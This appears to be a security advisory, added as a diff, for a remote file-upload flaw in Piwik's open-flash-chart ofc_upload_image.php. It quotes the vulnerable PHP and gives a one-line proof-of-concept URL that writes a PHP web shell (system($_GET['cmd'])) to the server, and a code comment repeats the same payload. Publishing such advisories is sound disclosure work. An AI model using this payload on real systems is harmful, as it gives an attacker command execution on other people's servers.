@@ -1,0 +1,41 @@
+Piwik Build <= 1357 2009-08-02 (ofc_upload_image.php) Remote File Upload
+Discovery: Braeden Thomas
+Versions Affected: All Piwik versions utilising open-flash-chart
+
+I. DESCRIPTION
+Piwik is an open source web analytics software. 
+It gives interesting reports on your website visitors, your popular pages, 
+the search engines keywords they used, the language they speak‚ and so much more.
+
+II. EXPLANATION
+The vulnerability exists in Piwik's implementation of "open-flash-chart",
+a module which resides in the "./libs/open-flash-chart/php-ofc-library" directory.
+
+The vulnerable code forces Piwik to create a directory called
+"./libs/open-flash-chart/tmp-upload-images" which in turn creates a file which is
+able to hold PHP code. This code however does not function correctly if global
+variables are unable to be overwritten.
+
+III. VULNERABILITY
+<?
+	$default_path = '../tmp-upload-images/';
+	if (!file_exists($default_path)) mkdir($default_path, 0777, true);
+		$destination = $default_path . basename( $_GET[ 'name' ] );  // This should be sanitised before use.
+	
+	echo 'Saving your image to: '. $destination; // and it tells us where it's saving it to, sigh.
+
+	$jfh = fopen($destination, 'w') or die("can't open file"); // The vulnerable code is right here.
+	fwrite($jfh, $HTTP_RAW_POST_DATA);			   // and here, <?phpinfo();?>, <?system($_GET['cmd']);?>
+	fclose($jfh);
+?>
+
+IV. PROOF OF CONCEPT
+./libs/open-flash-chart/php-ofc-library/ofc_upload_image.php?name=shell.php&HTTP_RAW_POST_DATA=<?system($_GET['cmd']);?>
+
+V. VENDOR
+The vendor has not been notified.
+
+VI. SOFTWARE AFFECTED
+Piwik and various other software utilising the open-flash-chart library.
+The latest version of open-flash-chart (version 2) also includes the vulnerable file
+yet may be omitted from various implementations of the open-flash-chart library.
